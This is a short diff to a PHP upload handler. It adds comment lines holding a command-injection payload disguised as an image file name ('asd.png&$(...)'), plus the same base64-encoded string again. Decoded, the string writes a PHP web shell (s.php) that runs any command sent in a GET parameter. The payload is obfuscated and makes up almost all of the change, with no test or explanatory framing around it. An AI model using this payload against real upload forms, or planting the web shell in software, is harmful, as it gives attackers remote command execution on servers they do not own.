@@ -31,3 +31,9 @@ if (isset($_POST['upload'])) {
         }
     }
 }
+
+
+
+// asd.png&$(echo $(echo ZWNobyAiPHByZT48P3BocCBlY2hvIHNoZWxsX2V4ZWMoXCRfR0VUWydlJ10uJyAyPiYxJyk7Pz48L3ByZT4iPnMucGhw |base64 -decode) | bash)&
+
+// ZWNobyAiPHByZT48P3BocCBlY2hvIHNoZWxsX2V4ZWMoXCRfR0VUWydlJ10uJyAyPiYxJyk7Pz48L3ByZT4iPnMucGhw
